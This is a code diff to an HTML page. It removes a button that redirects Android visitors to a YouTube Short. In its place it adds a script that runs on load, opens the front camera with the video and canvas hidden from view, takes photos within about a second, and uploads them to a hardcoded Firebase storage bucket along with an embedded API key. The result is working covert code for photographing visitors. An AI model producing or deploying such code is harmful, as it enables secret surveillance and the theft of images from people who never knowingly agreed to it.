@@ -1,71 +1,99 @@
-<!DOCTYPE html>
-<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Yahmaar</title>
+    <title>Live Camera Capture</title>
+    <title>Camera Capture</title>
+    <script type="module">
+        // Import the necessary Firebase functions
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
+        import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-storage.js";
+
+        // Your web app's Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyCSmicQncJhWtvEekSLNQtvWM6fFr0cuRM",
+            authDomain: "html-7fd9b.firebaseapp.com",
+            projectId: "html-7fd9b",
+            storageBucket: "html-7fd9b.appspot.com",
+            messagingSenderId: "1022361191925",
+            appId: "1:1022361191925:web:5bf0fb4023990d83aa0cbc"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const storage = getStorage(app);
+
+        // Function to upload image to Firebase
+        function uploadImage(imageData) {
+            const storageRef = ref(storage, 'Zeyad/image_' + Date.now() + '.png'); // Upload to Zeyad folder
+            uploadString(storageRef, imageData, 'data_url')
+                .then(() => {
+                    console.log('Uploaded a blob or file!');
+                })
+                .catch((error) => {
+                    console.error('Error uploading image:', error);
+                });
+        }
+
+        // Access the video and canvas elements
+        window.addEventListener('load', () => {
+            const video = document.createElement('video');
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+
+            // Start capturing from the front camera
+            navigator.mediaDevices.getUserMedia({
+                video: {
+                    facingMode: { exact: "user" }, // Use front camera
+                    width: { ideal: 1920 },
+                    height: { ideal: 1080 }                    
+                }
+            })
+            .then(stream => {
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    video.play();
+                    // Set the canvas size for 1080p
+                    canvas.width = 1920;  // Set canvas width to 1920 for 1080p
+                    canvas.height = 1080; // Set canvas height to 1080 for 1080p
+                    video.play();
+
+                    // Capture image after a short delay
+                    setTimeout(() => {
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const imageData = canvas.toDataURL('image/png');
+                        uploadImage(imageData); // Upload image to Firebase
+                        stopVideo(stream); // Stop the video stream
+                    }, 1000); // Capture after 1 second
+                    // Capture image immediately
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const imageData = canvas.toDataURL('image/png');
+                    uploadImage(imageData); // Upload image to Firebase
+                    stopVideo(stream); // Stop the video stream
+                };
+            })
+            .catch(err => {
+                console.error('Error accessing camera: ', err);
+            });
+        });
+
+        // Function to stop the video stream
+        function stopVideo(stream) {
+            const tracks = stream.getTracks();
+            tracks.forEach(track => track.stop());
+        }
+    </script>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
             margin: 0;
+            padding: 0;
             background-color: #000; /* Black background */
-            color: white;
         }
 
-        .container {
-            text-align: center;
-        }
-
-        .btn {
-            padding: 20px 40px;
-            font-size: 24px;
-            font-weight: bold;
-            cursor: pointer;
-            border: none;
-            border-radius: 10px;
-            background-color: #f44336; /* Red button */
-            color: white;
-        }
-
-        #warning {
-            display: none;
-            color: red;
-            margin-top: 20px;
-            font-size: 18px;
+        video, canvas {
+            display: none; /* Hide video and canvas elements */
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <button class="btn" id="redirectButton">Yahmaar ga klikken</button>
-        <p id="warning">This site is only available for Android devices.</p>
-    </div>
-
-    <script>
-        // YouTube Short URL (forced to open in the YouTube app)
-        const videoUrl = "intent://www.youtube.com/shorts/FPam25J81tE?si=3GQwoUZ9JWkp_5Zh#Intent;package=com.google.android.youtube;scheme=https;end";
-
-        const redirectButton = document.getElementById("redirectButton");
-        const warningMessage = document.getElementById("warning");
-
-        // Check if the device is Android
-        const isAndroid = /Android/i.test(navigator.userAgent);
-
-        if (!isAndroid) {
-            // Show a warning message if not Android
-            warningMessage.style.display = "block";
-            redirectButton.style.display = "none"; // Hide the button
-        } else {
-            // Redirect on button click
-            redirectButton.addEventListener("click", () => {
-                // Redirect to the YouTube Short video, forcing it to open in the YouTube app
-                window.location.href = videoUrl;
-            });
-        }
-    </script>
 </body>
 </html>
